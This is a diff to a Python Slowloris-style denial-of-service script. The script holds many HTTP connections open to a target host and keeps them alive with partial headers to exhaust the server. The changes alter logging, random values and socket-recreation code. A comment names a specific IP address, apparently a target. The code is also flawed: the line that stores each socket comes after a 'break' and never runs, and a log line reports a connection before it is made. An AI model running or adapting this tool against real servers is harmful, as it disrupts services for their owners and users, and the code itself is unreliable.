@@ -20,15 +20,15 @@ if args.host is None:
     sys.exit("\nA host is not given.")
 
 if args.verbose:
-    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
+    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d.%m.%Y %H:%M:%S", level=logging.DEBUG)
 else:
-    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)
+    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d.%m.%Y %H:%M:%S", level=logging.INFO)
 
-print("\n\nInitializing attack on:", args.host, "on port:", args.port, "with", args.sockets, "sockets.\n\n")
 
 sockets = []
 ip = args.host
 port = args.port
+print("\n\nInitializing attack on {}:{}".format(ip, port))
 
 # 160.153.129.19
 
@@ -42,7 +42,7 @@ def connect(host_ip):
     sock.settimeout(4)
     try:
         sock.connect((host_ip, port))
-        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1000)).encode("utf-8"))
+        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
 
         for header in headers:
             sock.send("{}\r\n".format(header).encode("utf-8"))
@@ -57,28 +57,31 @@ def connect(host_ip):
 
 
 def main():
-    ip = args.host
     socket_count = args.sockets
-    logging.info("Attacking to %s:%s with %s sockets.", ip, port, socket_count)
-
-    logging.info("Creating sockets...")
-    for _ in range(socket_count):
+    logging.info("Starting an attack to {}:{} with {} sockets.".format(ip, port, socket_count))
+    logging.info("Creating {} sockets...".format(socket_count))
+    for i in range(socket_count):
         try:
-            logging.debug("Creating socket nr %s", _)
+            logging.debug("Creating socket {}".format(i))
+            logging.debug("Socket {} connected to {}:{}".format(i, ip, port))
             s = connect(ip)
         except socket.error:
             break
             sockets.append(s)
 
     while True:
-        logging.info("Sending keep-alive headers... Socket count: %s", len(sockets))
-        for s in list(sockets):
+        logging.info("Resending the headers for keeping the connection alive...")
+        logging.info("Socket count: %s", len(sockets))
+        for s in sockets:
             try:
-                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+                s.send("X-a: {}\r\n".format(random.randint(1, 2000)).encode("utf-8"))
             except socket.error:
+                logging.info("Socket {} is timed out.".format(s.getsockname()))
                 sockets.remove(s)
 
-        for _ in range(socket_count - len(sockets)):
+        dead_sockets = socket_count - len(sockets)
+        logging.debug("Recreating {} new sockets...".format(dead_sockets))
+        for _ in range(dead_sockets):
             logging.debug("Recreating socket...")
             try:
                 s = connect(ip)
@@ -86,6 +89,7 @@ def main():
                     sockets.append(s)
             except socket.error:
                 break
+        logging.debug("Sleeping for 15 seconds in order to keep the connection alive.\n")
         time.sleep(15)
 
 main()
